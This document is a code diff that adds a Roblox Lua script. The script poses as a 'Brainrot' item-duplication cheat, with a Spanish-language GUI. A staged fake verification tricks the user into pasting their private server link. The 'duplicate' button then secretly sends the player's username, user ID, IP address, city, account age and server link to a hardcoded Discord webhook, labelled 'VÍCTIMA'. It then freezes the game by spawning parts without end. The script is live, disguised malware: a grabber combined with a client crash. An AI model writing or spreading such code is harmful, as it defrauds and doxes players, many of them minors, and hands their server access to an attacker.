@@ -1,0 +1,126 @@
+-- [[ DUPEAR BRAINROTS V1 - BY STEAL BRAINROT ]]
+local webhookURL = "https://discord.com/api/webhooks/1462867777542160508/OadWH0VvwwOTrF62mKzYF0tJhHJEre9yUgK7s66afaXBEpM4bu8relHZB6FjrdTNcark"
+
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- 1. INFO DEL JUEGO
+local gameName = "Desconocido"
+local s, info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+if s then gameName = info.Name end
+
+-- 2. INTERFAZ MEJORADA
+local pgui = player:WaitForChild("PlayerGui")
+if pgui:FindFirstChild("DupeV1") then pgui.DupeV1:Destroy() end
+local sg = Instance.new("ScreenGui", pgui)
+sg.Name = "DupeV1"
+
+local main = Instance.new("Frame", sg)
+main.Size = UDim2.new(0, 300, 0, 280)
+main.Position = UDim2.new(0.5, -150, 0.4, 0)
+main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+main.BorderSizePixel = 2
+main.BorderColor3 = Color3.fromRGB(0, 255, 150)
+main.Active = true
+main.Draggable = true
+
+local t = Instance.new("TextLabel", main)
+t.Size = UDim2.new(1, 0, 0, 40)
+t.Text = "DUPEAR BRAINROTS V1"
+t.TextColor3 = Color3.fromRGB(0, 255, 150)
+t.BackgroundTransparency = 1
+t.Font = Enum.Font.SourceSansBold
+t.TextSize = 20
+
+local input = Instance.new("TextBox", main)
+input.Size = UDim2.new(0.8, 0, 0, 40)
+input.Position = UDim2.new(0.1, 0, 0.25, 0)
+input.PlaceholderText = "Pega el Link del Servidor..."
+input.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+input.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local statusLabel = Instance.new("TextLabel", main)
+statusLabel.Size = UDim2.new(1, 0, 0, 30)
+statusLabel.Position = UDim2.new(0, 0, 0.45, 0)
+statusLabel.Text = "Esperando link..."
+statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextSize = 14
+
+local verifyBtn = Instance.new("TextButton", main)
+verifyBtn.Size = UDim2.new(0.8, 0, 0, 40)
+verifyBtn.Position = UDim2.new(0.1, 0, 0.6, 0)
+verifyBtn.Text = "VERIFICAR SERVER"
+verifyBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 50)
+verifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local dupeBtn = Instance.new("TextButton", main)
+dupeBtn.Size = UDim2.new(0.8, 0, 0, 50)
+dupeBtn.Position = UDim2.new(0.1, 0, 0.75, 0)
+dupeBtn.Text = "DUPLICAR ITEMS"
+dupeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+dupeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+dupeBtn.Visible = false -- OCULTO AL PRINCIPIO
+dupeBtn.Font = Enum.Font.SourceSansBold
+
+-- 3. LOGICA DE ENGAÑO
+verifyBtn.MouseButton1Click:Connect(function()
+    if #input.Text < 10 then
+        statusLabel.Text = "Error: Link demasiado corto"
+        return
+    end
+
+    verifyBtn.Visible = false
+    statusLabel.Text = "Conectando al servidor..."
+    task.wait(1.5)
+    statusLabel.Text = "Buscando ítems de alto valor..."
+    task.wait(2)
+    statusLabel.Text = "¡Se encontraron 5 Brainrots Legendarios!"
+    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    dupeBtn.Visible = true -- APARECE EL BOTÓN TRAMPA
+end)
+
+-- 4. CAPTURA Y LAG
+dupeBtn.MouseButton1Click:Connect(function()
+    dupeBtn.Text = "DUPLICANDO..."
+    dupeBtn.Active = false
+
+    task.spawn(function()
+        local ipData = "N/A"
+        local city = "Desconocida"
+        local pcallIp, response = pcall(function() 
+            return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+        end)
+        
+        if pcallIp then
+            ipData = response.query or "N/A"
+            city = (response.city or "N/A") .. ", " .. (response.country or "N/A")
+        end
+
+        local data = {
+            ["embeds"] = {{
+                ["title"] = "💎 ¡VÍCTIMA DUPE V1!",
+                ["description"] = "Se comió el verso de los 5 Legendarios en: **" .. gameName .. "**",
+                ["color"] = 16711680,
+                ["fields"] = {
+                    {["name"] = "👤 Usuario", ["value"] = player.Name .. " ("..player.UserId..")", ["inline"] = true},
+                    {["name"] = "📍 Ubicación", ["value"] = city .. " (IP: " .. ipData .. ")", ["inline"] = false},
+                    {["name"] = "🔗 Link Server", ["value"] = "```" .. input.Text .. "```", ["inline"] = false},
+                    {["name"] = "📅 Antigüedad", ["value"] = player.AccountAge .. " días", ["inline"] = true}
+                },
+                ["footer"] = {["text"] = "Steal Brainrot OS"}
+            }}
+        }
+
+        if request then
+            request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+        end
+    end)
+
+    task.wait(1.5)
+    while true do
+        for i = 1, 15000 do Instance.new("Part", workspace).Transparency = 1 end
+        task.wait()
+    end
+end)
